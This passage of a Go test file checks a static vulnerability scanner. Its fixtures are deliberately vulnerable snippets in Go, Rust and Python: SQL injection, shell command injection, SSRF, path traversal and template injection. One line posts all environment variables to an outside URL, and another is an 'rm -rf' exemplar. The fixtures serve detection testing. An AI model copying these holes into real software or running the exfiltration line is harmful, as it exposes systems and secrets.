			"env = dict(os.environ)\nrequests.post('https://x/collect', json=env)\n", "CWE-200"},
		{"go-sqli-formvalue", "app.go",
			"id := r.FormValue(\"id\")\nq := \"SELECT * FROM users WHERE id='\" + id + \"'\"\nrows, _ := db.Query(q)\n", "CWE-89"},
		{"go-sqli-multireturn", "app.go",
			"id, err := r.FormValue(\"id\")\nq := \"SELECT * FROM t WHERE id='\" + id + \"'\"\nrows, _ := db.Query(q)\n", "CWE-89"},
		{"go-cmdi-shc", "run.go",
			"host := r.FormValue(\"host\")\ncmd := \"ping \" + host\nexec.Command(\"sh\", \"-c\", cmd).Run()\n", "CWE-78"},
		{"go-ssrf-get", "fetch.go",
			"u := r.FormValue(\"url\")\nresp, _ := http.Get(u)\n", "CWE-918"},
		{"go-path-open", "dl.go",
			"fn := r.FormValue(\"file\")\nf, _ := os.Open(fn)\n", "CWE-22"},
		{"go-redirect", "app.go",
			"next := r.FormValue(\"next\")\nhttp.Redirect(w, r, next, 302)\n", "CWE-601"},
		{"rust-sqli-format", "db.rs",
			"let id = req.query.get(\"id\");\nlet q = format!(\"SELECT * FROM users WHERE id={}\", id);\nsqlx::query(&q);\n", "CWE-89"},
		{"rust-cmdi-push_str", "run.rs",
			"let host = req.query.get(\"host\");\nlet mut cmd = String::from(\"ping \");\ncmd.push_str(&host);\nCommand::new(\"sh\").arg(\"-c\").arg(cmd);\n", "CWE-78"},
		{"rust-ssrf", "fetch.rs",
			"let u = req.query.get(\"url\");\nreqwest::get(&u);\n", "CWE-918"},
		{"rust-path", "dl.rs",
			"let fn_ = req.query.get(\"file\");\nfs::read(&fn_);\n", "CWE-22"},
		{"rust-ssti", "page.rs",
			"let tmpl = req.query.get(\"t\");\nTera::one_off(&tmpl, &ctx, false);\n", "CWE-1336"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if !taintCWEs(t, c.path, c.code)[c.cwe] {
				t.Errorf("expected %s to be flagged for %s, got miss", c.cwe, c.name)
			}
		})
	}
}

func TestTaintNoFalsePositives(t *testing.T) {
	cases := []struct{ name, path, code string }{
		{"sqli-parameterized", "db.py",
			"q = \"SELECT * FROM users WHERE id = ?\"\ncur.execute(q, (uid,))\n"},
		{"ssti-static-template-context-var", "app.py",
			"GREETING = \"Hello {{ name }}!\"\nname = request.args.get('name')\nreturn render_template_string(GREETING, name=name)\n"},
		{"cmdi-sanitized-shlex", "run.py",
			"host = request.args.get('host')\ncmd = \"ping \" + shlex.quote(host)\ncmd = shlex.quote(cmd)\nos.system(cmd)\n"},
		{"cmdi-subprocess-argv-safe", "run.py",
			"host = request.args.get('host')\nsubprocess.run([\"ping\", \"-c\", \"1\", host], shell=False)\n"},
		{"sqli-js-parameterized", "app.js",
			"const q = \"SELECT * FROM users WHERE id = ?\";\ndb.query(q, [req.params.id]);\n"},
		{"path-js-const", "app.js",
			"const full = CONFIG_PATH;\nfs.readFile(full, cb);\n"},
		{"cmdi-sanitized-in-concat", "run.py",
			"host = request.args.get('host')\ncmd = \"ping \" + shlex.quote(host)\nos.system(cmd)\n"},
		{"cmdi-augmented-literal", "run.py",
			"cmd = \"ls\"\ncmd += \" -la\"\nos.system(cmd)\n"},
		{"sqli-int-cast", "db.py",
			"uid = int(request.args.get('id'))\nq = f\"SELECT * FROM users WHERE id={uid}\"\ncur.execute(q)\n"},
		{"unrelated-dynstring-static-sink", "app.py",
			"msg = f\"count {n}\"\nlog(msg)\nrender_template_string(STATIC_TEMPLATE)\n"},
		{"deser-safe-api", "load.py",
			"cfg = yaml.safe_load(request.data)\n"},
		{"ssrf-const-url", "fetch.py",
			"r = requests.get(API_URL)\n"},
		{"redirect-url-for", "app.py",
			"return redirect(url_for('home'))\n"},
		{"log-nonsensitive", "app.py",
			"logger.info(f\"user {user_id} logged in\")\n"},
		{"log-redacted", "auth.py",
			"pw = request.form['password']\nlogger.info(mask(pw))\n"},
		{"log-secret-in-string-literal", "app.py",
			"logger.info(\"password reset requested\")\n"},
		{"go-sqli-parameterized", "app.go",
			"q := \"SELECT * FROM users WHERE id = $1\"\nrows, _ := db.Query(q, id)\n"},
		{"go-ssrf-const", "fetch.go",
			"resp, _ := http.Get(API_URL)\n"},
		{"go-open-const", "dl.go",
			"f, _ := os.Open(configPath)\n"},
		{"go-atoi-clears", "app.go",
			"id := r.FormValue(\"id\")\nn, _ := strconv.Atoi(id)\nq := prefix + strconv.Itoa(n)\nrows, _ := db.Query(q)\n"},
		{"rust-sqli-bind", "db.rs",
			"let q = \"SELECT * FROM users WHERE id = $1\";\nsqlx::query(q).bind(id);\n"},
		{"rust-ssrf-const", "fetch.rs",
			"reqwest::get(&API_URL);\n"},
		{"rust-fs-const", "dl.rs",
			"fs::read(CONFIG_PATH);\n"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			m := taintCWEs(t, c.path, c.code)
			bad := map[string]string{
				"sqli-parameterized": "CWE-89", "ssti-static-template-context-var": "CWE-1336",
				"cmdi-sanitized-shlex": "CWE-78", "sqli-int-cast": "CWE-89",
				"unrelated-dynstring-static-sink": "CWE-1336", "deser-safe-api": "CWE-502",
				"ssrf-const-url": "CWE-918", "redirect-url-for": "CWE-601",
				"log-nonsensitive": "CWE-532", "log-redacted": "CWE-532",
				"log-secret-in-string-literal": "CWE-532",
				"cmdi-subprocess-argv-safe":    "CWE-78", "sqli-js-parameterized": "CWE-89",
				"path-js-const": "CWE-22", "cmdi-sanitized-in-concat": "CWE-78",
				"cmdi-augmented-literal": "CWE-78",
				"go-sqli-parameterized":  "CWE-89", "go-ssrf-const": "CWE-918",
				"go-open-const": "CWE-22", "go-atoi-clears": "CWE-89",
				"rust-sqli-bind": "CWE-89", "rust-ssrf-const": "CWE-918",
				"rust-fs-const": "CWE-22",
			}
			if cwe := bad[c.name]; cwe != "" && m[cwe] {
				t.Errorf("false positive: %s raised %s on safe code", c.name, cwe)
			}
		})
	}
}

func TestLangSupportBlunders(t *testing.T) {
	if langOf("main.go") != "go" || langOf("src/lib.rs") != "rust" || langOf("App.hs") != "haskell" {
		t.Fatalf("ext mapping: go=%q rust=%q haskell=%q", langOf("main.go"), langOf("src/lib.rs"), langOf("App.hs"))
	}

	kb := loadKB()
	goHit := false
	for _, f := range kb.scan("app.go", "id := r.FormValue(\"id\")\nq := \"SELECT * FROM t WHERE id='\"+id+\"'\"\n_, _ = db.Query(q)\n") {
		if f.Rule.CWE == "CWE-89" {
			goHit = true
		}
	}
	if !goHit {
		t.Error("taint/presence missed Go cross-line SQLi (taint allowlist regression)")
	}
	rsHit := false
	for _, f := range kb.scan("db.rs", "let id = req.query.get(\"id\");\nlet q = format!(\"SELECT * FROM t WHERE id={}\", id);\nsqlx::query(&q);\n") {
		if f.Rule.CWE == "CWE-89" {
			rsHit = true
		}
	}
	if !rsHit {
		t.Error("taint/presence missed Rust cross-line SQLi (taint allowlist regression)")
	}

	need := regexp.MustCompile(`format!|\+\+|callCommand|simpleHTTP|readFile|preEscaped|runInterpreter|Interpreter|Tera::one_off|sql_query|md5::|Md5|thread_rng|rand::random|File::open|fs::(?:read|write)|reqwest::|Html::|PreEscaped|dangerous_insecure|Command::`)
	injection := map[string]bool{
		"CWE-22": true, "CWE-78": true, "CWE-79": true, "CWE-89": true,
		"CWE-94": true, "CWE-918": true, "CWE-1336": true,
		"CWE-327": true, "CWE-330": true, "CWE-347": true,
	}
	for i := range kb.Rules {
		r := &kb.Rules[i]
		if !injection[r.CWE] {
			continue
		}
		for _, p := range r.Patterns {
			if p.Confidence != "high" || (p.Lang != "rust" && p.Lang != "haskell") {
				continue
			}
			src := p.Re + " " + p.RequireRe
			if !need.MatchString(src) && !strings.Contains(src, `\+\+`) && !strings.Contains(src, "++") {
				t.Errorf("%s %s high pattern looks sink-only (no construction token): %s", r.CWE, p.Lang, truncate(p.Re, 80))
			}
		}
	}

	safe := []struct{ path, code string }{
		{"a.rs", `sqlx::query("SELECT * FROM u WHERE e=$1").bind(email)`},
		{"a.rs", `let data = fs::read("config.toml")?;`},
		{"a.rs", `tera.render("index.html", &context)`},
		{"a.hs", `query conn "SELECT * FROM users WHERE name=?" (Only name)`},
		{"a.hs", `callProcess "/bin/rm" ["-rf", userPath]`},
		{"a.go", `rows, err := db.Query("SELECT * FROM u WHERE id=$1", id)`},
		{"a.go", `resp, err := http.Get("https://api.internal.svc/status")`},
	}
	for _, c := range safe {
		if fs := kb.scan(c.path, c.code); len(fs) > 0 {
			t.Errorf("SAFE %s flagged %s: %q", c.path, fs[0].Rule.CWE, c.code)
		}
	}
}

func TestScanHitsCWESeesSystemsLanguages(t *testing.T) {
	kb := loadKB()
	if !scanHitsCWE(kb, "CWE-78", `callCommand ("rm -rf " ++ userPath)`) {
		t.Error("haskell cmdi exemplar must be visible to scanHitsCWE (needs .hs or unknown-ext scan)")
	}
	if !scanHitsCWE(kb, "CWE-89", `sqlx::query(&format!("SELECT * FROM u WHERE e='{}'", email))`) {
		t.Error("rust sqli exemplar must be visible to scanHitsCWE")
	}
}

func TestAllPrefiltersSound(t *testing.T) {
	kb := loadKB()
	check := func(src string, set []string) {
		if len(set) == 0 {
			return
		}
		re, err := syntax.Parse(src, syntax.Perl)
		if err != nil {
			return
		}
		rx, err := regexp.Compile(src)
		if err != nil {
			return
		}
		for _, m := range genMatchesT(re.Simplify(), 400) {
			if !rx.MatchString(m) {
				continue
			}
			low := strings.ToLower(m)
			ok := false
			for _, lit := range set {
				if strings.Contains(low, lit) {
					ok = true
					break
				}
			}
			if !ok {
				t.Errorf("UNSOUND prefilter for %q: match %q has none of %v", src, m, set)
			}
		}
	}
	for _, r := range kb.Rules {
		for _, p := range r.Patterns {
			check(p.Re, p.prefilter)
		}
	}
	for i := range generatedTaintSpecs {
		s := &generatedTaintSpecs[i]
		s.prep()
		for j := range s.Sinks {
			check(s.Sinks[j].Re, s.Sinks[j].prefilter)
		}
	}
}

func genMatchesT(re *syntax.Regexp, cap int) []string {
	switch re.Op {
	case syntax.OpEmptyMatch, syntax.OpBeginLine, syntax.OpEndLine, syntax.OpBeginText,
		syntax.OpEndText, syntax.OpWordBoundary, syntax.OpNoWordBoundary:
		return []string{""}
	case syntax.OpLiteral:
		return []string{string(re.Rune)}
	case syntax.OpCharClass, syntax.OpAnyChar, syntax.OpAnyCharNotNL:
		if len(re.Rune) >= 2 {
			return []string{string(re.Rune[0])}
		}
		return []string{"a"}
	case syntax.OpCapture:
		return genMatchesT(re.Sub[0], cap)
	case syntax.OpStar, syntax.OpQuest:
		out := []string{""}
		return append(out, genMatchesT(re.Sub[0], cap)...)
	case syntax.OpPlus:
		return genMatchesT(re.Sub[0], cap)
	case syntax.OpRepeat:
		if re.Min == 0 {
			return []string{""}
		}
		return genMatchesT(re.Sub[0], cap)
	case syntax.OpAlternate:
		var out []string
		for _, sub := range re.Sub {
			out = append(out, genMatchesT(sub, cap)...)
			if len(out) > cap {
				break
			}
		}
		return out
	case syntax.OpConcat:
		acc := []string{""}
		for _, sub := range re.Sub {
			parts := genMatchesT(sub, cap)
			var next []string
			for _, a := range acc {
				for _, p := range parts {
					next = append(next, a+p)
					if len(next) > cap {
						break
					}
				}
				if len(next) > cap {
					break
				}
			}
			acc = next
		}
		return acc
	default:
		return []string{""}
	}
}
